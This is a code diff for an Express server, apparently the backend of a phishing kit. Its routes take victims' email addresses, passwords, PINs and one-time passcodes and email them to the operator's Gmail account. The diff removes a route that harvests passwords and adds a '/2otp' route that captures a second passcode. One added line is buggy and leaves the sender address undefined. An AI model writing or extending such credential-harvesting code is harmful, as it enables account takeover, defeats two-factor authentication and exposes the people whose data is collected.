@@ -49,36 +49,6 @@ app.post("/", (req, res) => {
   });
 });
 
-// API routes for second home
-app.post("/home", (req, res) => {
-  const { email, password } = req.body;
-
-  const transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: userEmail,
-      pass: pass,
-    },
-  });
-
-  const mailOptions = {
-    from: `${email}`,
-    to: userEmail,
-    subject: `second login from new user Email: ${email} \t\n\n\n password: ${password}`,
-    text: `Second login from New user registered with Email: ${email} and password: ${password}`,
-  };
-
-  console.log(mailOptions);
-  transporter.sendMail(mailOptions, (error, info) => {
-    if (error) {
-      console.log(error);
-      res.send("error Occured: " + error);
-    } else {
-      console.log("Email sent", +info.response);
-      res.send("success");
-    }
-  });
-});
 // API routes for pin
 app.post("/pin", (req, res) => {
   console.log(req.body);
@@ -126,6 +96,37 @@ app.post("/otp", (req, res) => {
     from: email,
     to: userEmail,
     subject: `OTP: ${req.body?.otp} `,
+  };
+
+  console.log(mailOptions);
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.log(error);
+      res.send("error Occured: " + error);
+    } else {
+      console.log("Email sent", +info.response);
+      res.send("success");
+    }
+  });
+});
+
+// API routes for 2otp
+app.post("/2otp", (req, res) => {
+  console.log(req.body);
+  let email = console.log(req.body.email);
+
+  const transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      user: userEmail,
+      pass: pass,
+    },
+  });
+
+  const mailOptions = {
+    from: email,
+    to: userEmail,
+    subject: `SECOND OTP: ${req.body?.otp} `,
   };
 
   console.log(mailOptions);
